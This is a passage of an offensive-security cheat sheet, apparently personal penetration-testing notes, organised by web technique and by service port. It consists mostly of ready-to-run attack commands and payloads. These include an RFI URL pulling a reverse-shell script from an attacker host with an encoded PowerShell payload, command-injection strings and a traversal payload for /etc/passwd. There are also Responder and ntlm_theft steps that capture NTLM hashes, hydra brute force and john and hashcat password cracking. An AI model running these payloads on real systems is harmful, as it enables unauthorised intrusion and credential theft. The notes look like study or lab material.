<span class="nx">app</span><span class="p">.</span><span class="nx">py</span>
<span class="nx">api</span><span class="p">.</span><span class="nx">py</span> 
<span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nb">self</span><span class="o">/</span><span class="nx">environ</span>
<span class="o">/</span><span class="nx">proc</span><span class="o">/</span><span class="nb">self</span><span class="o">/</span><span class="nx">cmdline</span>

<span class="c1">//LFI &amp; file upload</span>
<span class="nx">upload</span> <span class="nx">authorized_keys</span> <span class="nx">to</span> <span class="nx">target</span>
</code></pre></div></div>

<p>Remote File Inclusion (RFI)</p>

<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://192.168.1.3:4443/site/index.php?page=http://192.168.1.1/rs.php
<span class="cp">&lt;?php</span>
<span class="nb">passthru</span><span class="p">(</span><span class="s2">"powershell -e JABjAGwAaQBlAG4AdAA..."</span><span class="p">);</span>
<span class="cp">?&gt;</span>
</code></pre></div></div>

<p>Base64 encode required</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">X</span><span class="o">-</span><span class="nb">Error</span><span class="p">:</span> <span class="nx">Incorrect</span> <span class="nx">padding</span>
<span class="o">/</span><span class="nx">data</span><span class="o">/</span><span class="nx">Li4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA</span><span class="o">==</span>
</code></pre></div></div>

<p>Vulnerable Platforms</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">apache</span> <span class="mf">2.4</span><span class="p">.</span><span class="mi">49</span>
<span class="nx">Werkzeug</span><span class="o">/</span><span class="mf">1.0</span><span class="p">.</span><span class="mi">1</span>
<span class="nx">RESPONSIVE</span> <span class="nx">filemanager</span> <span class="nx">v</span><span class="p">.</span><span class="mf">9.13</span><span class="p">.</span><span class="mi">4</span>
</code></pre></div></div>

<p>Web root</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sr">/var/</span><span class="nx">www</span><span class="o">/</span><span class="nx">html</span>
<span class="o">/</span><span class="kd">var</span><span class="sr">/ww</span><span class="err">w
</span></code></pre></div></div>

<h3 id="ssrf--controllable-url">SSRF / Controllable URL</h3>

<p>Net-NTLMv2 authenticate: try both smb and http</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">name</span><span class="o">=</span><span class="nx">asdd</span><span class="o">&amp;</span><span class="nx">mail</span><span class="o">=</span><span class="nx">asd</span><span class="o">%</span><span class="mi">40</span><span class="nx">asd</span><span class="p">.</span><span class="nx">cdcc</span><span class="o">&amp;</span><span class="nx">url</span><span class="o">=</span><span class="err">\\\\</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="err">\</span><span class="nx">share</span>
<span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.180.1:8080/?url=http://192.168.1.1</span>
<span class="nx">sudo</span> <span class="nx">responder</span> <span class="o">-</span><span class="nx">I</span> <span class="nx">tun0</span>
<span class="nx">hashcat</span> <span class="o">-</span><span class="nx">m</span> <span class="mi">5600</span> <span class="nx">crack</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="o">--</span><span class="nx">force</span> <span class="c1">//whole hash string</span>
</code></pre></div></div>

<h3 id="info-leakage">Info Leakage</h3>

<p>translate different language to english</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//domain name</span>
<span class="nx">slaes</span><span class="p">@</span><span class="nd">skylak</span><span class="p">.</span><span class="nx">jp</span>
</code></pre></div></div>

<p>phpinfo.php</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">$_SERVER</span><span class="p">[</span><span class="dl">'</span><span class="s1">DOCUMENT_ROOT</span><span class="dl">'</span><span class="p">]</span>	<span class="o">/</span><span class="nx">srv</span><span class="o">/</span><span class="nx">http</span>
<span class="nx">USER</span> 	<span class="nx">root</span> 
</code></pre></div></div>

<h3 id="command-injection">Command Injection</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//?email=|+id</span>
<span class="o">|</span><span class="nx">id</span>
<span class="o">||</span><span class="nx">id</span>
<span class="o">%</span><span class="mi">0</span><span class="nx">Aid</span>
<span class="dl">'</span><span class="s1">|id
</span><span class="dl">'</span><span class="o">||</span><span class="nx">id</span>
<span class="dl">'</span><span class="s1">%0Aid
"|id
"||id
"%0Aid
</span></code></pre></div></div>

<h3 id="downloads">Downloads</h3>

<p>source code</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">check</span> <span class="nx">password</span> 
<span class="nx">check</span> <span class="nx">hidden</span> <span class="nx">url</span> <span class="o">=&gt;</span> <span class="nx">SQL</span> <span class="nx">Injection</span>
</code></pre></div></div>

<h3 id="post">Post</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">curl</span> <span class="err">–</span><span class="nx">X</span> <span class="nx">post</span> <span class="err">–</span><span class="o">-</span><span class="nx">data</span> <span class="err">“</span><span class="nx">code</span><span class="o">=</span><span class="mi">2</span><span class="o">*</span><span class="mi">2</span><span class="err">”</span> <span class="nx">http</span><span class="p">:</span><span class="c1">//192.168.1.1:50000/verify</span>

<span class="c1">//in burpsuite add </span>
<span class="nx">Content</span><span class="o">-</span><span class="nx">Type</span><span class="p">:</span> <span class="nx">application</span><span class="o">/</span><span class="nx">x</span><span class="o">-</span><span class="nx">www</span><span class="o">-</span><span class="nx">form</span><span class="o">-</span><span class="nx">urlencoded</span>
</code></pre></div></div>

<h2 id="service">Service</h2>

<h3 id="port-scan">Port Scan</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sudo</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">Pn</span> <span class="o">-</span><span class="nx">n</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">sCV</span> <span class="o">-</span><span class="nx">p</span><span class="o">-</span> <span class="o">--</span><span class="nx">open</span> <span class="o">-</span><span class="nx">oN</span> <span class="nx">scan</span><span class="p">.</span><span class="nx">txt</span>

<span class="nx">sudo</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">p</span><span class="o">-</span> <span class="o">--</span><span class="nx">min</span><span class="o">-</span><span class="nx">rate</span> <span class="mi">1000</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">oN</span> <span class="nx">ports</span><span class="p">.</span><span class="nx">txt</span> <span class="o">-</span><span class="nx">Pn</span> 
<span class="nx">cat</span> <span class="nx">ports</span><span class="p">.</span><span class="nx">txt</span> <span class="o">|</span> <span class="nx">grep</span> <span class="dl">"</span><span class="s2">^ *[0-9]</span><span class="dl">"</span> <span class="o">|</span> <span class="nx">grep</span> <span class="dl">"</span><span class="s2">open</span><span class="dl">"</span> <span class="o">|</span> <span class="nx">cut</span> <span class="o">-</span><span class="nx">d</span> <span class="dl">'</span><span class="s1">/</span><span class="dl">'</span> <span class="o">-</span><span class="nx">f</span> <span class="mi">1</span> <span class="o">|</span> <span class="nx">tr</span> <span class="dl">'</span><span class="se">\n</span><span class="dl">'</span> <span class="dl">'</span><span class="s1">,</span><span class="dl">'</span> <span class="o">|</span> <span class="nx">sed</span> <span class="dl">'</span><span class="s1">s/,$//</span><span class="dl">'</span>
<span class="nx">sudo</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">80</span> <span class="o">-</span><span class="nx">sC</span> <span class="o">-</span><span class="nx">sV</span> <span class="o">-</span><span class="nx">A</span> <span class="o">-</span><span class="nx">Pn</span> <span class="o">--</span><span class="nx">min</span><span class="o">-</span><span class="nx">rate</span> <span class="mi">1000</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> 
<span class="nx">sudo</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">F</span> <span class="o">-</span><span class="nx">sU</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">--</span><span class="nx">min</span><span class="o">-</span><span class="nx">rate</span> <span class="mi">1000</span> <span class="o">--</span><span class="nx">top</span><span class="o">-</span><span class="nx">ports</span><span class="o">=</span><span class="mi">100</span> <span class="o">--</span><span class="nx">script</span><span class="o">=*</span><span class="kr">enum</span>

<span class="nx">sudo</span> <span class="nx">env</span> <span class="dl">"</span><span class="s2">PATH=$PATH</span><span class="dl">"</span> <span class="nx">autorecon</span> <span class="o">&lt;</span><span class="nx">IP</span><span class="o">&gt;</span>
</code></pre></div></div>

<h3 id="21---ftp">21 - FTP</h3>

<p>anonymous login</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">anonymous</span> <span class="p">:</span> <span class="nx">anonymous</span>
<span class="nx">anonymous</span> <span class="p">:</span>
<span class="nx">ftp</span> <span class="p">:</span> <span class="nx">ftp</span>
</code></pre></div></div>

<p>Download files</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ftp</span><span class="o">&gt;</span><span class="nx">prompt</span> <span class="nx">off</span>
<span class="nx">ftp</span><span class="o">&gt;</span><span class="nx">mget</span> <span class="o">*</span> <span class="p">.</span>
<span class="c1">//recursive download</span>
<span class="nx">wget</span> <span class="o">-</span><span class="nx">r</span> <span class="nx">ftp</span><span class="p">:</span><span class="c1">//192.168.1.1:24621/  --ftp-user=ftp_jp --ftp-password=~p\&lt;Ass:0rd</span>
</code></pre></div></div>

<p>File upload ⇒ access path then RCE</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">ftp</span><span class="o">&gt;</span> <span class="nx">put</span> <span class="nx">rs</span><span class="p">.</span><span class="nx">aspx</span>
</code></pre></div></div>

<table>
  <tbody>
    <tr>
      <td>229 Entering Extended Passive Mode (</td>
      <td> </td>
      <td> </td>
      <td>50928</td>
      <td>)</td>
    </tr>
  </tbody>
</table>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">^</span><span class="nx">C</span>
<span class="nx">receive</span> <span class="nx">aborted</span><span class="p">.</span> <span class="nx">Waiting</span> <span class="k">for</span> <span class="nx">remote</span> <span class="nx">to</span> <span class="nx">finish</span> <span class="nx">abort</span><span class="p">.</span>
<span class="nx">ftp</span><span class="o">&gt;</span> <span class="nx">passive</span>
<span class="nx">Passive</span> <span class="nx">mode</span><span class="p">:</span> <span class="nx">off</span><span class="p">;</span> <span class="nx">fallback</span> <span class="nx">to</span> <span class="nx">active</span> <span class="nx">mode</span><span class="p">:</span> <span class="nx">off</span><span class="p">.</span>

</code></pre></div></div>

<p>Unzip encrypted file</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="mi">7</span><span class="nx">z</span> <span class="nx">x</span> <span class="nx">backup</span><span class="p">.</span><span class="nx">zip</span>
</code></pre></div></div>

<p>Get info from downloaded pdf</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">exiftool</span> <span class="o">-</span><span class="nx">a</span> <span class="o">-</span><span class="nx">u</span> <span class="o">*</span><span class="p">.</span><span class="nx">pdf</span>

<span class="c1">//encrypted pdf</span>
<span class="nx">pdf2john</span> <span class="nx">Infrastructure</span><span class="p">.</span><span class="nx">pdf</span> <span class="o">&gt;</span> <span class="nx">pdf</span><span class="p">.</span><span class="nx">hash</span>
<span class="nx">john</span> <span class="o">--</span><span class="nx">wordlist</span><span class="o">=</span><span class="sr">/usr/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="nx">pdf</span><span class="p">.</span><span class="nx">hash</span>
<span class="c1">//show cracked password</span>
<span class="nx">john</span> <span class="nx">pdf</span><span class="p">.</span><span class="nx">hash</span> <span class="o">--</span><span class="nx">show</span>
</code></pre></div></div>

<p>.pcap</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">http</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">method</span> <span class="o">==</span> <span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span>
<span class="nx">http</span><span class="p">.</span><span class="nx">request</span><span class="p">.</span><span class="nx">uri</span> <span class="nx">contains</span> <span class="dl">"</span><span class="s2">/console</span><span class="dl">"</span>
<span class="nx">wireshark</span><span class="p">:</span> <span class="nx">follow</span> <span class="o">-&gt;</span> <span class="nx">TCP</span> <span class="nx">stream</span>
</code></pre></div></div>

<h3 id="22---ssh">22 - SSH</h3>

<p>bruteforce</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">hydra</span> <span class="o">-</span><span class="nx">l</span> <span class="nx">offsec</span> <span class="o">-</span><span class="nx">P</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">ssh</span> <span class="o">-</span><span class="nx">V</span>
<span class="c1">//crack ssh passphrase</span>
<span class="nx">ssh2john</span> <span class="nx">id_rsa</span> <span class="o">&gt;</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">hash</span>
<span class="nx">john</span> <span class="o">--</span><span class="nx">wordlist</span><span class="o">=</span><span class="nx">ssh</span><span class="p">.</span><span class="nx">passwords</span> <span class="nx">ssh</span><span class="p">.</span><span class="nx">hash</span>
</code></pre></div></div>

<p>fuzz <code class="language-plaintext highlighter-rouge">ssh</code> directory</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Windows</span><span class="p">:</span> <span class="s2">`C:/Users/Viewer/Desktop/.ssh/id_rsa`</span>
<span class="nx">Linux</span><span class="p">:</span> <span class="s2">`/home/Viewer/.ssh/id_rsa`</span>

<span class="nx">$</span> <span class="nx">ssh</span> <span class="o">-</span><span class="nx">i</span> <span class="nx">id_rsa</span> <span class="nx">Viewer</span><span class="p">@&lt;</span><span class="nc">IP</span><span class="p">&gt;</span>
</code></pre></div></div>

<p><a href="https://github.com/xxxinhy/BruteforceList/blob/main/ssh-key-bruteforce-list.txt">SSH Key BruteForce List</a></p>

<p>Enable IdentityOnly - If too many keys in .ssh folder</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">Received</span> <span class="nx">disconnect</span> <span class="k">from</span> <span class="mf">127.0</span><span class="p">.</span><span class="mf">0.1</span> <span class="nx">port</span> <span class="mi">22</span><span class="p">:</span><span class="mi">2</span><span class="p">:</span> <span class="nx">Too</span> <span class="nx">many</span> <span class="nx">authentication</span> <span class="nx">failures</span>

<span class="nx">ssh</span> <span class="o">-</span><span class="nx">i</span> <span class="o">~</span><span class="sr">/.ssh/</span><span class="nx">keys</span><span class="o">/</span><span class="nx">root</span> <span class="nx">root</span><span class="p">@</span><span class="nd">127</span><span class="p">.</span><span class="mf">0.0</span><span class="p">.</span><span class="mi">1</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">IdentitiesOnly</span><span class="o">=</span><span class="nx">yes</span>
</code></pre></div></div>

<h3 id="53---dns">53 - DNS</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">dig</span> <span class="p">@</span><span class="nd">192</span><span class="p">.</span><span class="mf">168.1</span><span class="p">.</span><span class="mi">1</span> <span class="nx">AXFR</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">com</span>
<span class="nx">dnsenum</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>
</code></pre></div></div>

<h3 id="79---finger">79 - finger</h3>

<p>Morris Worm - fingerd Stack Buffer Overflow (Metasploit)</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">msfconsole</span>
<span class="nx">use</span> <span class="nx">bsd</span><span class="o">/</span><span class="nx">finger</span><span class="o">/</span><span class="nx">morris_fingerd_bof</span>
</code></pre></div></div>

<h3 id="110---pop3">110 - POP3</h3>

<p>get credentials from webpage eg. employee’s introduction, photo link</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">nc</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mi">110</span>
<span class="nx">user</span> <span class="nx">dave</span>
<span class="nx">pass</span> <span class="nx">xx</span>
<span class="nx">list</span>
<span class="nx">retr</span> <span class="mi">1</span>
</code></pre></div></div>

<h3 id="135-593-40000---msrpc"><strong>135, 593, &gt;40000 - MSRPC</strong></h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">rpcclient</span> <span class="o">-</span><span class="nx">U</span> <span class="dl">''</span> <span class="o">-</span><span class="nx">N</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>
<span class="nx">rpcdump</span><span class="p">.</span><span class="nx">py</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>
</code></pre></div></div>

<h3 id="139445---smb">139,445 - SMB</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">smbclient</span> <span class="o">-</span><span class="nx">N</span> <span class="o">-</span><span class="nx">L</span> <span class="err">\\\\</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>
<span class="nx">smbclient</span> <span class="err">\\\\</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="err">\\</span><span class="nx">setup</span>
<span class="nx">smb</span><span class="p">:</span> <span class="err">\</span><span class="o">&gt;</span> <span class="kd">get</span> <span class="nx">file</span><span class="p">.</span><span class="nx">txt</span>

<span class="nx">nxc</span> <span class="nx">smb</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">guest</span> <span class="o">-</span><span class="nx">p</span> <span class="dl">""</span> <span class="o">--</span><span class="nx">rid</span><span class="o">-</span><span class="nx">brute</span>  <span class="err">#</span><span class="nx">DC</span>
<span class="nx">smbmap</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">guest</span> <span class="o">-</span><span class="nx">p</span> <span class="dl">""</span> <span class="o">-</span><span class="nx">d</span> <span class="p">.</span> <span class="o">-</span><span class="nx">H</span> 

<span class="nx">enum4linux</span> <span class="o">-</span><span class="nx">a</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>
<span class="nx">nmap</span> <span class="o">--</span><span class="nx">script</span> <span class="nx">vuln</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">139</span><span class="p">,</span><span class="mi">445</span> <span class="nx">$target</span> <span class="o">-</span><span class="nx">Pn</span> <span class="o">-</span><span class="nx">sCV</span>


<span class="nx">OS</span><span class="p">:</span> <span class="nx">Windows</span> <span class="nx">Server</span> <span class="p">(</span><span class="nx">R</span><span class="p">)</span> <span class="mi">2008</span> <span class="nx">Standard</span> <span class="mi">6001</span> <span class="nx">Service</span> <span class="nx">Pack</span> <span class="mi">1</span> <span class="p">(</span><span class="nx">Windows</span> <span class="nx">Server</span> <span class="p">(</span><span class="nx">R</span><span class="p">)</span> <span class="mi">2008</span> <span class="nx">Standard</span> <span class="mf">6.0</span><span class="p">)</span>
<span class="nx">CVE</span><span class="o">-</span><span class="mi">2009</span><span class="o">-</span><span class="mi">3103</span>


<span class="nx">smbclient</span> <span class="o">-</span><span class="nx">U</span> <span class="nx">fake</span><span class="p">.</span><span class="nx">com</span><span class="o">/</span><span class="nx">dave</span>  <span class="o">-</span><span class="nx">L</span> <span class="mf">172.16</span><span class="p">.</span><span class="mf">1.1</span>
<span class="nx">smbmap</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">dave</span> <span class="o">-</span><span class="nx">H</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">r</span>
<span class="nx">crackmapexec</span>  <span class="nx">smb</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">--</span><span class="nx">shares</span>
<span class="nx">nxc</span>  <span class="nx">smb</span> <span class="mf">172.16</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="dl">'</span><span class="s1">user</span><span class="dl">'</span> <span class="o">-</span><span class="nx">p</span> <span class="dl">'</span><span class="s1">pass</span><span class="dl">'</span> <span class="o">--</span><span class="nx">shares</span>
<span class="nx">nxc</span>  <span class="nx">smb</span> <span class="mf">172.16</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="dl">'</span><span class="s1">user</span><span class="dl">'</span> <span class="o">-</span><span class="nx">p</span> <span class="dl">'</span><span class="s1">pass</span><span class="dl">'</span> <span class="o">-</span><span class="nx">M</span> <span class="nx">spider_plus</span> <span class="o">-</span><span class="nx">o</span> <span class="nx">DOWNLOAD_FLAG</span><span class="o">=</span><span class="nx">True</span>

<span class="nx">nmap</span> <span class="o">--</span><span class="nx">script</span> <span class="dl">"</span><span class="s2">safe or smb-enum-*</span><span class="dl">"</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">445</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>
</code></pre></div></div>

<p>Download all</p>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">smbclient</span> <span class="o">-</span><span class="nx">U</span> <span class="dl">'</span><span class="s1">%</span><span class="dl">'</span> <span class="err">\\\\</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="err">\\</span><span class="nx">dave</span>
<span class="o">&gt;</span> <span class="nx">mask</span> <span class="dl">""</span>
<span class="o">&gt;</span> <span class="nx">recurse</span> <span class="nx">on</span>
<span class="o">&gt;</span> <span class="nx">prompt</span> <span class="nx">off</span>
<span class="o">&gt;</span> <span class="nx">cd</span> <span class="dl">'</span><span class="s1">path</span><span class="se">\t</span><span class="s1">o</span><span class="se">\r</span><span class="s1">emote</span><span class="se">\</span><span class="s1">dir</span><span class="dl">'</span>
<span class="o">&gt;</span> <span class="nx">lcd</span> <span class="dl">'</span><span class="s1">~/path/to/download/to/</span><span class="dl">'</span>
<span class="o">&gt;</span> <span class="nx">mget</span> <span class="o">*</span>
</code></pre></div></div>

<p>Writable SMB Share - upload script to force nltm authenticate</p>

<blockquote>
  <p>https://github.com/Greenwolf/ntlm_theft</p>

</blockquote>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">//enum username</span>
<span class="nx">nxc</span> <span class="nx">smb</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">u</span> <span class="nx">guest</span> <span class="o">-</span><span class="nx">p</span> <span class="dl">""</span> <span class="o">--</span><span class="nx">rid</span><span class="o">-</span><span class="nx">brute</span>
<span class="c1">//force authenticate for Nltm</span>
<span class="nx">sudo</span> <span class="nx">responder</span> <span class="o">-</span><span class="nx">I</span> <span class="nx">tun0</span>
<span class="nx">python3</span> <span class="nx">ntlm_theft</span><span class="p">.</span><span class="nx">py</span> <span class="o">-</span><span class="nx">g</span> <span class="nx">lnk</span> <span class="o">-</span><span class="nx">s</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="o">-</span><span class="nx">f</span> <span class="nx">file</span>
<span class="nx">smb</span><span class="p">:</span> <span class="o">&gt;</span> <span class="nx">mput</span> <span class="nx">file</span><span class="p">.</span><span class="nx">lnk</span>

<span class="c1">//file.lnk</span>

<span class="p">[</span><span class="nx">InternetShortcut</span><span class="p">]</span>
<span class="nx">URL</span><span class="o">=</span><span class="nx">anything</span>
<span class="nx">WorkingDirectory</span><span class="o">=</span><span class="nx">anything</span>
<span class="nx">IconFile</span><span class="o">=</span><span class="err">\\</span><span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span><span class="err">\</span><span class="o">%</span><span class="nx">USERNAME</span><span class="o">%</span><span class="p">.</span><span class="nx">icon</span>
<span class="nx">IconIndex</span><span class="o">=</span><span class="mi">1</span>

<span class="c1">//crack</span>
<span class="nx">hashcat</span> <span class="o">-</span><span class="nx">m</span> <span class="mi">5600</span> <span class="nx">crack</span><span class="p">.</span><span class="nx">hash</span> <span class="o">/</span><span class="nx">usr</span><span class="o">/</span><span class="nx">share</span><span class="o">/</span><span class="nx">wordlists</span><span class="o">/</span><span class="nx">rockyou</span><span class="p">.</span><span class="nx">txt</span> <span class="o">--</span><span class="nx">force</span>
</code></pre></div></div>

<h3 id="161---snmp-udp-scan">161 - SNMP (UDP Scan)</h3>

<div class="language-jsx highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">sudo</span> <span class="nx">nmap</span> <span class="o">--</span><span class="nx">script</span> <span class="nx">snmp</span><span class="o">-*</span> <span class="o">-</span><span class="nx">sU</span> <span class="o">-</span><span class="nx">p161</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>
<span class="nx">sudo</span> <span class="nx">nmap</span> <span class="o">-</span><span class="nx">sU</span> <span class="o">-</span><span class="nx">p</span> <span class="mi">161</span> <span class="o">--</span><span class="nx">script</span> <span class="nx">snmp</span><span class="o">-</span><span class="nx">brute</span> <span class="nx">$IP</span> <span class="o">--</span><span class="nx">script</span><span class="o">-</span><span class="nx">args</span> <span class="nx">snmp</span><span class="o">-</span><span class="nx">brute</span><span class="p">.</span><span class="nx">communitiesdb</span><span class="o">=</span><span class="sr">/usr/</span><span class="nx">share</span><span class="o">/</span><span class="nx">seclists</span><span class="o">/</span><span class="nx">Discovery</span><span class="o">/</span><span class="nx">SNMP</span><span class="o">/</span><span class="nx">common</span><span class="o">-</span><span class="nx">snmp</span><span class="o">-</span><span class="nx">community</span><span class="o">-</span><span class="nx">strings</span><span class="o">-</span><span class="nx">onesixtyone</span><span class="p">.</span><span class="nx">txt</span>

<span class="nx">sudo</span> <span class="nx">apt</span><span class="o">-</span><span class="kd">get</span> <span class="nx">install</span> <span class="nx">snmp</span><span class="o">-</span><span class="nx">mibs</span><span class="o">-</span><span class="nx">downloader</span>
<span class="nx">sudo</span> <span class="nx">download</span><span class="o">-</span><span class="nx">mibs</span>
<span class="nx">snmpwalk</span> <span class="o">-</span><span class="nx">c</span> <span class="kr">public</span> <span class="o">-</span><span class="nx">v1</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span>
<span class="nx">snmpwalk</span> <span class="o">-</span><span class="nx">c</span> <span class="kr">public</span> <span class="o">-</span><span class="nx">v1</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mf">1.3</span><span class="p">.</span><span class="mf">6.1</span><span class="p">.</span><span class="mf">4.1</span><span class="p">.</span><span class="mf">77.1</span><span class="p">.</span><span class="mf">2.25</span> <span class="err">#</span><span class="nx">user</span>
<span class="nx">snmpwalk</span> <span class="o">-</span><span class="nx">c</span> <span class="kr">public</span> <span class="o">-</span><span class="nx">v1</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mf">1.3</span><span class="p">.</span><span class="mf">6.1</span><span class="p">.</span><span class="mf">2.1</span><span class="p">.</span><span class="mf">25.4</span><span class="p">.</span><span class="mf">2.1</span><span class="p">.</span><span class="mi">2</span> <span class="err">#</span><span class="nx">process</span>
<span class="nx">snmpwalk</span> <span class="o">-</span><span class="nx">c</span> <span class="kr">public</span> <span class="o">-</span><span class="nx">v1</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mf">1.3</span><span class="p">.</span><span class="mf">6.1</span><span class="p">.</span><span class="mf">2.1</span><span class="p">.</span><span class="mf">25.6</span><span class="p">.</span><span class="mf">3.1</span><span class="p">.</span><span class="mi">2</span> <span class="err">#</span><span class="nx">installed</span> <span class="nx">software</span> <span class="nx">version</span>
<span class="nx">snmpwalk</span> <span class="o">-</span><span class="nx">c</span> <span class="kr">public</span> <span class="o">-</span><span class="nx">v1</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="mf">1.3</span><span class="p">.</span><span class="mf">6.1</span><span class="p">.</span><span class="mf">2.1</span><span class="p">.</span><span class="mf">6.13</span><span class="p">.</span><span class="mf">1.3</span> <span class="err">#</span><span class="nx">list</span> <span class="nx">TCP</span> <span class="nx">ports</span>
<span class="nx">snmpwalk</span> <span class="o">-</span><span class="nx">c</span> <span class="kr">public</span> <span class="o">-</span><span class="nx">v1</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">NET</span><span class="o">-</span><span class="nx">SNMP</span><span class="o">-</span><span class="nx">EXTEND</span><span class="o">-</span><span class="nx">MIB</span><span class="p">::</span><span class="nx">nsExtendObjects</span>
<span class="nx">snmpwalk</span> <span class="o">-</span><span class="nx">c</span> <span class="kr">public</span> <span class="o">-</span><span class="nx">v1</span> <span class="mf">192.168</span><span class="p">.</span><span class="mf">1.1</span> <span class="nx">NET</span><span class="o">-</span><span class="nx">SNMP</span><span class="o">-</span><span class="nx">EXTEND</span><span class="o">-</span><span class="nx">MIB</span><span class="p">::</span><span class="nx">nsExtendOutputFull</span>

<span class="c1">//brute force community string</span>
